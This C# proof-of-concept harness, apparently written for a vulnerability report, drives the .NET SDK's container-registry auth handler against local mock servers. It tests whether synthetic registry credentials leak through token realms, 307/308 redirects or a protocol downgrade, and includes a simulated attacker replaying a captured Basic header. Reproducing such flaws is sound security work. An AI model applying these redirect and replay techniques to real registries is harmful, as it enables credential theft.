// Downstream impact probes. All listeners use 127.0.0.1/127.0.0.2 with ephemeral lab-only TLS.
// No real cloud credentials, public targets, or external network accesses.
using System.Collections.Concurrent;
using System.Net;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.Loader;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging.Abstractions;

record ImpactObservation(
    string Role, string Method, string Path,
    bool SyntheticBasic, bool SyntheticPasswordInForm,
    bool ProtectedCanaryBearer);

static class ExtendedImpactLab
{
    private const string User="LAB_USER_NON_SECRET";
    private const string Password="LAB_PASS_SYNTHETIC_ONLY_20261116";
    private const string RegistryBearer="LAB_BEARER_NON_SECRET";
    private const string ProtectedCanary="LAB_PROTECTED_JSON_TOKEN_SYNTHETIC";
    private const string ProtectedResource="LAB_REPLAY_RESOURCE_SYNTHETIC";
    private const string PrivateHost="privateauth.lab.test";
    private const string PublicHost="publicauth.lab.test";
    private const string RegistryHost="registry.lab.test";
    private const string PrivateAddress="127.0.0.2";
    private const string PublicAddress="127.0.0.1";
    private static readonly string Sdk=Environment.GetEnvironmentVariable("SDK_VER")??"unknown";
    private static readonly bool Is11=Sdk.StartsWith("11.",StringComparison.Ordinal);
    private static readonly List<object> Reports=[];
    private static readonly string[] Cases=[
        "internal-token-json",
        "internal-non-token-json",
        "redirect307-canary",
        "redirect308-canary",
        "redirect307-write",
        "redirect302-no-body",
        "https-to-http-downgrade",
        "registry-302-basic-challenge",
        "conditional-credential-replay"
    ];

    public static async Task RunAsync()
    {
        var assemblyPath=Environment.GetEnvironmentVariable("DOTNET_SDK_CONTAINER_ASSEMBLY")??throw new InvalidOperationException("SDK assembly missing");
        var asm=AssemblyLoadContext.Default.LoadFromAssemblyPath(Path.GetFullPath(assemblyPath));
        bool allValid=true;
        try
        {
            foreach(var name in Cases)
            {
                var (pass,outcome)=await RunOneAsync(asm,name);
                Console.WriteLine("[DOWNSTREAM "+Sdk+"] "+name+": "+(pass is null?"OBSERVED":pass.Value?"PASS":"FAIL")+" outcome="+outcome);
                if(pass is false)allValid=false;
            }
        }
        finally
        {
            Directory.CreateDirectory("REPRODUCTION-EVIDENCE");
            File.WriteAllText("REPRODUCTION-EVIDENCE/sdk-"+Sdk+"-downstream.json",
                JsonSerializer.Serialize(new{sdk=Sdk,assemblyPath,tests=Reports},
                    new JsonSerializerOptions{WriteIndented=true}));
        }
        if(!allValid)throw new Exception("A downstream regression assertion failed; inspect artifact");
    }

    private static HttpClient SdkClient(Assembly asm,string registry)
    {
        var handlerType=asm.GetType("Microsoft.NET.Build.Containers.AuthHandshakeMessageHandler",true)!;
        var mode=Enum.Parse(asm.GetType("Microsoft.NET.Build.Containers.RegistryMode",true)!,"Push");
        var inner=new SocketsHttpHandler{UseCookies=false,UseProxy=false,ConnectTimeout=TimeSpan.FromSeconds(5)};
        object[] args=Is11?[registry,false,inner,NullLogger.Instance,mode]:[registry,inner,NullLogger.Instance,mode];
        var ctor=handlerType.GetConstructors(BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Instance).Single(c=>c.GetParameters().Length==args.Length);
        return new HttpClient((HttpMessageHandler)ctor.Invoke(args)){Timeout=TimeSpan.FromSeconds(12)};
    }

    private static ImpactObservation Observe(string role,HttpContext ctx,string body)
    {
        var auth=ctx.Request.Headers.Authorization.ToString();
        var basic="Basic "+Convert.ToBase64String(Encoding.ASCII.GetBytes(User+":"+Password));
        return new ImpactObservation(role,ctx.Request.Method,ctx.Request.Path,
            auth==basic,body.Contains(Password,StringComparison.Ordinal),
            auth=="Bearer "+ProtectedCanary);
    }
    private static async Task Respond(HttpContext ctx,int status,string text="",string? location=null,string? challenge=null)
    {
        ctx.Response.StatusCode=status;
        if(location is not null)ctx.Response.Headers.Location=location;
        if(challenge is not null)ctx.Response.Headers.WWWAuthenticate=challenge;
        if(text.Length>0)
        {
            ctx.Response.ContentType="application/json";
            await ctx.Response.WriteAsync(text);
        }
    }

    private static async Task<(bool? pass,string outcome)> RunOneAsync(Assembly asm,string scenario)
    {
        bool downgrade=scenario=="https-to-http-downgrade";
        var protectedObservations=new ConcurrentQueue<ImpactObservation>();
        var allowedObservations=new ConcurrentQueue<ImpactObservation>();
        var registryObservations=new ConcurrentQueue<ImpactObservation>();
        int syntheticSideEffects=0;
        string? capturedBasicAuth=null;
        string? registryRealm=null;
        string? redirectDestination=null;
        var privateJson="{\"token\":\""+ProtectedCanary+"\",\"expires_in\":60}";
        var publicJson="{\"token\":\""+RegistryBearer+"\",\"expires_in\":60}";

        await using var privateServer=await LocalEndpoint.Start(PrivateAddress,async ctx=>
        {
            string body=await new StreamReader(ctx.Request.Body).ReadToEndAsync();
            var obs=Observe("private",ctx,body);
            protectedObservations.Enqueue(obs);

            if(scenario=="registry-302-basic-challenge")
            {
                if(obs.SyntheticBasic)await Respond(ctx,200,"{}");
                else await Respond(ctx,401,challenge:"Basic realm=\"synthetic-protected\"");
                return;
            }
            if(scenario=="conditional-credential-replay")
            {
                if(ctx.Request.Path=="/shared-resource" && obs.SyntheticBasic)
                    await Respond(ctx,200,"{\"resource\":\""+ProtectedResource+"\"}");
                else await Respond(ctx,401,challenge:"Basic realm=\"synthetic-shared\"");
                return;
            }
            if(scenario=="internal-non-token-json")
            {
                await Respond(ctx,200,"{\"private_data\":\"SYNTHETIC_INTERNAL_VALUE\"}");
                return;
            }
            if(scenario=="redirect307-write" && ctx.Request.Path=="/mock-action" &&
                ctx.Request.Method=="POST" && obs.SyntheticPasswordInForm &&
                body.Contains("grant_type=password",StringComparison.Ordinal))
            {
                Interlocked.Increment(ref syntheticSideEffects);
            }
            await Respond(ctx,200,privateJson);
        },tls:!downgrade);

        string privateUrl="https://"+PrivateHost+":"+privateServer.Port;
        redirectDestination=scenario switch
        {
            "redirect307-write"=>privateUrl+"/mock-action",
            "https-to-http-downgrade"=>"http://"+PrivateHost+":"+privateServer.Port+"/capture",
            "registry-302-basic-challenge"=>privateUrl+"/challenge",
            _=>privateUrl+"/capture"
        };

        await using var publicServer=await LocalEndpoint.Start(PublicAddress,async ctx=>
        {
            string body=await new StreamReader(ctx.Request.Body).ReadToEndAsync();
            var obs=Observe("public-token",ctx,body);
            allowedObservations.Enqueue(obs);
            if(obs.SyntheticBasic)
                capturedBasicAuth=ctx.Request.Headers.Authorization.ToString();

            if(scenario.StartsWith("redirect",StringComparison.Ordinal) ||
                scenario=="https-to-http-downgrade")
            {
                if(ctx.Request.Method=="GET")
                {
                    await Respond(ctx,405);
                    return;
                }
                int redirectCode=scenario switch
                {
                    "redirect302-no-body"=>302,
                    "redirect308-canary"=>308,
                    _=>307
                };
                await Respond(ctx,redirectCode,location:redirectDestination);
            }
            else await Respond(ctx,200,publicJson);
        },tls:true);
        registryRealm=(scenario.StartsWith("internal-",StringComparison.Ordinal))
            ? privateUrl+"/token" : "https://"+PublicHost+":"+publicServer.Port+"/token";

        await using var registryServer=await LocalEndpoint.Start(PublicAddress,async ctx=>
        {
            string body=await new StreamReader(ctx.Request.Body).ReadToEndAsync();
            var obs=Observe("registry",ctx,body);
            registryObservations.Enqueue(obs);

            if(scenario=="registry-302-basic-challenge")
            {
                await Respond(ctx,302,location:redirectDestination);
                return;
            }
            if(ctx.Request.Headers.Authorization.ToString().StartsWith("Bearer ",StringComparison.Ordinal))
            {
                await Respond(ctx,200,"{}");
                return;
            }
            await Respond(ctx,401,challenge:"Bearer realm=\""+registryRealm+"\",service=\"isolated-test\",scope=\"repository:demo:push\"");
        },tls:true);

        int? sdkStatus=null;
        string? sdkError=null;
        try
        {
            using var sdk=SdkClient(asm,RegistryHost+":"+registryServer.Port);
            using var response=await sdk.GetAsync("https://"+RegistryHost+":"+registryServer.Port+"/v2/");
            sdkStatus=(int)response.StatusCode;
        }
        catch(Exception ex) {sdkError=ex.GetBaseException().GetType().Name+": "+ex.GetBaseException().Message;}

        int? replayStatus=null;bool replayedResource=false;
        if(scenario=="conditional-credential-replay" && capturedBasicAuth is not null)
        {
            // Simulated attacker can replay the exact synthetic header ONLY because the mock
            // secondary application deliberately accepts the SAME credentials.
            using var simulatedAttacker=new HttpClient(new SocketsHttpHandler{UseProxy=false});
            using var request=new HttpRequestMessage(HttpMethod.Get,privateUrl+"/shared-resource");
            request.Headers.TryAddWithoutValidation("Authorization",capturedBasicAuth);
            using var replayResponse=await simulatedAttacker.SendAsync(request);
            replayStatus=(int)replayResponse.StatusCode;
            replayedResource=(await replayResponse.Content.ReadAsStringAsync()).Contains(ProtectedResource,StringComparison.Ordinal);
        }

        var p=protectedObservations.ToArray();
        var a=allowedObservations.ToArray();
        var r=registryObservations.ToArray();
        bool protectedVisited=p.Length>0;
        bool protectedGotPassword=p.Any(x=>x.SyntheticPasswordInForm);
        bool protectedGotBasic=p.Any(x=>x.SyntheticBasic);
        bool registryGotPrivateCanary=r.Any(x=>x.ProtectedCanaryBearer);
        bool protectedGotPost=p.Any(x=>x.Method=="POST");
        bool protectedGotGet=p.Any(x=>x.Method=="GET");
        bool? pass=scenario switch
        {
            "internal-token-json"=> sdkStatus==200 && protectedGotBasic && registryGotPrivateCanary,
            "internal-non-token-json"=> protectedGotBasic && !registryGotPrivateCanary && sdkError is not null,
            "redirect307-canary"=> sdkStatus==200 && protectedGotPost && protectedGotPassword && registryGotPrivateCanary,
            "redirect308-canary"=> sdkStatus==200 && protectedGotPost && protectedGotPassword && registryGotPrivateCanary,
            "redirect307-write"=> sdkStatus==200 && protectedGotPost && protectedGotPassword && syntheticSideEffects==1,
            "redirect302-no-body"=> sdkStatus==200 && protectedGotGet && !protectedGotPassword && !protectedGotPost,
            "https-to-http-downgrade"=> !protectedVisited && sdkStatus!=200,
            "registry-302-basic-challenge"=> null, // exploratory: no pre-assertion of redirected Basic response
            "conditional-credential-replay"=> sdkStatus==200 && replayedResource && replayStatus==200 && a.Any(x=>x.SyntheticBasic),
            _=>false
        };
        string outcome=scenario=="registry-302-basic-challenge"
            ? (protectedGotBasic?"redirected-basic-received":"redirected-basic-not-received")
            : pass is true?"expected-controlled-observation":"control-mismatch";
        Reports.Add(new {
            scenario,pass,outcome,sdkStatus,sdkError,
            protectedRequestCount=p.Length,publicTokenRequestCount=a.Length,registryRequestCount=r.Length,
            protectedGotBasic,protectedGotPassword,protectedGotPost,protectedGotGet,
            registryGotPrivateCanary,syntheticSideEffects,
            allowedServiceSawSyntheticBasic=a.Any(x=>x.SyntheticBasic),
            replayStatus,replayedResource,
            protectedObservations=p,publicTokenObservations=a,registryObservations=r
        });
        return (pass,outcome);
    }
}
